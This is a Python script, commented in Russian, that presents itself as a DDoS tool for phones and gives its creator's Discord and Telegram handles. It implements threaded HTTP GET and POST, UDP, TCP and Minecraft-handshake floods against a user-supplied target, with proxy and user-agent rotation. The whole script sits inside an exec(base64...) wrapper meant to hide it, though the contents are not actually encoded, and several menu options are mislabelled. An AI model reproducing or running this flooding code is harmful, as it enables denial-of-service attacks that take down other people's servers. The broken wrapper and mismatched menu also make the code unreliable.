
import base64
exec(base64.b64decode("import os
import socket
import struct
import threading
import random
import requests
import time

# Баннер
def display_banner():
    print("""
    ███████╗███████╗ █████╗ ██████╗ ███████╗██████╗ ███████╗
    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝
    ███████╗█████╗  ███████║██████╔╝█████╗  ██║  ██║███████╗
    ╚════██║██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██║  ██║╚════██║
    ███████║███████╗██║  ██║██║     ███████╗██████╔╝███████║
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═════╝ ╚══════╝
        💥Сильный инструмент для DDoS на телефоне 💥
                    V:1.0 mobile BETA  Creator: discord:banananehasca2
                    tg:@userforest t.me/HSIIHoficial
    """)

# Функция для запуска нового окна CMD
def open_new_cmd_window():
    os.system(f'start cmd /K "python {__file__}"')

# Вспомогательная функция для случайного User-Agent
def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(agents)

# Функция для управления прокси
def set_proxy(proxy=None):
    if proxy:
        return {"http": proxy, "https": proxy}
    return None

# Метод: HTTP GET Flood (с поддержкой HTTPS)
def http_get_flood(target, threads, proxy=None):
    print(f"[GET Flood] Цель: {target} | Потоки: {threads}")
    for _ in range(threads):
        threading.Thread(target=send_http_get, args=(target, proxy)).start()

def send_http_get(target, proxy):
    while True:
        try:
            proxies = set_proxy(proxy)
            response = requests.get(target, headers={'User-Agent': random_user_agent()}, proxies=proxies, timeout=3)
            print(f"[GET Flood] Отправлено на {target} | Код: {response.status_code}")
            time.sleep(random.uniform(0.1, 0.5))  # Уменьшаем задержку, чтобы нагрузить сервер
        except Exception as e:
            print(f"[GET Flood] Ошибка: {e}")

# Метод: HTTP POST Flood
def http_post_flood(target, threads, proxy=None):
    print(f"[POST Flood] Цель: {target} | Потоки: {threads}")
    for _ in range(threads):
        threading.Thread(target=send_http_post, args=(target, proxy)).start()

def send_http_post(target, proxy):
    while True:
        try:
            data = random._urandom(2048)  # Увеличиваем размер данных
            proxies = set_proxy(proxy)
            response = requests.post(target, data=data, headers={'User-Agent': random_user_agent()}, proxies=proxies, timeout=3)
            print(f"[POST Flood] Отправлено на {target} | Код: {response.status_code}")
            time.sleep(random.uniform(0.1, 0.5))  # Уменьшаем задержку
        except Exception as e:
            print(f"[POST Flood] Ошибка: {e}")

# Метод: UDP Flood
def udp_flood(target, port, threads):
    print(f"[UDP Flood] Цель: {target}:{port} | Потоки: {threads}")
    for _ in range(threads):
        threading.Thread(target=send_udp_packets, args=(target, port)).start()

def send_udp_packets(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            data = random._urandom(8192)  # Увеличиваем размер пакета для более сильной нагрузки
            sock.sendto(data, (target, port))
            print(f"[UDP Flood] Пакет отправлен на {target}:{port}")
            time.sleep(random.uniform(0.1, 0.5))  # Уменьшаем задержку
        except Exception as e:
            print(f"[UDP Flood] Ошибка: {e}")

# Метод: TCP Flood
def tcp_flood(target, port, threads):
    print(f"[TCP Flood] Цель: {target}:{port} | Потоки: {threads}")
    for _ in range(threads):
        threading.Thread(target=send_tcp_packets, args=(target, port)).start()

def send_tcp_packets(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            data = random._urandom(2048)  # Увеличиваем размер пакета
            sock.send(data)
            print(f"[TCP Flood] Пакет отправлен на {target}:{port}")
            sock.close()
            time.sleep(random.uniform(0.1, 0.5))  # Уменьшаем задержку
        except Exception as e:
            print(f"[TCP Flood] Ошибка: {e}")

# Метод: Minecraft DDoS
def minecraft_ddos(target, port, threads):
    print(f"[Minecraft DDoS] Цель: {target}:{port} | Потоки: {threads}")
    for _ in range(threads):
        threading.Thread(target=send_minecraft_packets, args=(target, port)).start()

def send_minecraft_packets(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            handshake = struct.pack("!B", 0x00) + \
                        struct.pack("!H", len(target)) + target.encode() + \
                        struct.pack("!H", port) + struct.pack("!B", 1)
            sock.send(handshake)
            print(f"[Minecraft DDoS] Пакет отправлен на {target}:{port}")
            sock.close()
            time.sleep(random.uniform(0.1, 0.5))  # Уменьшаем задержку
        except Exception as e:
            print(f"[Minecraft DDoS] Ошибка: {e}")

# Главное меню
def main():
    display_banner()
    print("Выберите метод атаки:")
    print("1. HTTP GET Flood")
    print("2. HTTP POST Flood")
    print("3. UDP Flood")
    print("4. TCP Flood")
    print("5. Minecraft DDoS")
    print("6. Добавить прокси")
    print("7. Выйти")

    choice = input("Введите номер метода: ")

    if choice == "1":
        target = input("Введите URL (например, https://example.com): ")
        threads = int(input("Введите количество потоков: "))
        proxy = input("Введите прокси (если есть, иначе оставьте пустым): ")
        http_get_flood(target, threads, proxy)
    elif choice == "2":
        target = input("Введите URL (например, https://example.com): ")
        threads = int(input("Введите количество потоков: "))
        proxy = input("Введите прокси (если есть, иначе оставьте пустым): ")
        http_post_flood(target, threads, proxy)
    elif choice == "3":
        target = input("Введите IP: ")
        port = int(input("Введите порт: "))
        threads = int(input("Введите количество потоков: "))
        udp_flood(target, port, threads)
    elif choice == "4":
        target = input("Введите IP: ")
        port = int(input("Введите порт: "))
        threads = int(input("Введите количество потоков: "))
        tcp_flood(target, port, threads)
    elif choice == "5":
        target = input("Введите IP или домен Minecraft сервера: ")
        port = int(input("Введите порт: "))
        threads = int(input("Введите количество потоков: "))
        minecraft_ddos(target, port, threads)
    elif choice == "6":
        open_new_cmd_window()
    elif choice == "7":
        proxy = input("Введите прокси (например, http://proxy.com:8080): ")
        print(f"Прокси {proxy} добавлен")
        main()
    elif choice == "8":
        print("Выход...")
        exit()
    else:
        print("Неверный выбор.")
        main()

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    main()").decode())
